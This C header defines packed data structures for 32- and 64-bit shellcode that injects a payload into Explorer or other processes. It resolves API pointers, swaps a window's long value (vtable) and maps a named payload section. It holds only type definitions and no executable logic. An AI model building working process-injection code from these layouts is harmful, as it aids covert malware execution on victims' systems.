#ifndef __SCDEFINES_H_
#define __SCDEFINES_H_

#pragma pack(push, 1)

typedef struct _payload_info {
    uint32_t payloadSize;
    char payloadName[8];
} payload_info_t, *ppayload_info_t;

typedef struct _explorer_shellcode_data32
{
    void* (*_OpenFileMapping)(uint32_t dwDesiredAccess, int bInheritHandle, const char* lpName);
    void* (*_MapViewOfFile)(void* hFileMappingObject, uint32_t dwDesiredAccess, uint32_t dwFileOffsetHigh, uint32_t dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
    void (*_CloseHandle)(void* hHandle);
    void* (*_CreateThread)(void* lpThread, SIZE_T dwStackSize, void* lpAddress, void* lpParameter, uint32_t dwFlags, uint32_t* lpThreadId);
    long_t (*_SetWindowLong)(void* hWnd, int nIndex, long_t dwNewLong);
    long_t oldLongVtable;
    void* hWnd;
    pvoid_t injectEntry;
    payload_info_t pi;
    pvoid_t piEntry;
    char mappingName[10];
    uint8_t lock;
} explorer_shellcode_data32, *pexplorer_shellcode_data32;

typedef struct _explorer_shellcode_data64
{
    union
    {
        long_t (*_f)(void* hWnd, int nIndex, LONG_PTR dwNewLong);
        uint64_t Addr;
    } _SetWindowLongPtr;

    union
    {
        void* (*_f)(uint32_t dwDesiredAccess, int bInheritHandle, LPCTSTR lpName);
        uint64_t Addr;
    } _OpenFileMapping;

    union
    {
        void* (*_f)(void* hFileMappingObject, uint32_t dwDesiredAccess, uint32_t dwFileOffsetHigh, uint32_t dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
        uint64_t Addr;
    } _MapViewOfFile;

    union
    {
        void (*_f)(void* hHandle);
        uint64_t Addr;
    } _CloseHandle;

    union
    {
        void* (*_f)(void* lpThread, SIZE_T dwStackSize, void* lpAddress, void* lpParameter, uint32_t dwFlags, uint32_t* lpThreadId);
        uint64_t Addr;
    } _CreateThread;

    uint64_t oldLongVtable;
    uint64_t hWnd;
    uint64_t injectEntry;
    payload_info_t pi;
    uint64_t piEntry;
    char mappingName[10];
    uint8_t lock;    
} explorer_shellcode_data64, *pexplorer_shellcode_data64;

typedef struct _std_shellcode_data
{
    union {
        uint64_t addr64;
        uint32_t addr32;
        puint_t ptr;
    } fnOpenFileMappingA;

    union {
        uint64_t addr64;
        uint32_t addr32;
        puint_t ptr;
    } fnMapViewOfFile;

    union {
        uint64_t addr64;
        uint32_t addr32;
        puint_t ptr;
    } fnUnmapViewOfFile;

    union {
        uint64_t addr64;
        uint32_t addr32;
        puint_t ptr;
    } fnCloseHandle;

    union {
        uint64_t addr64;
        uint32_t addr32;
        puint_t ptr;
    } fnCreateThread;

    union {
        uint64_t addr64;
        uint32_t addr32;
        puint_t ptr;
    } fnTerminateProcess;

    char mappingName[12];
    uint32_t injectEntryRva;
    payload_info_t pi;
    uint32_t piEntryRva;
    int needTerminate;
} std_shellcode_data, *pstd_shellcode_data;

#pragma pack(pop)


#endif // __SCDEFINES_H_
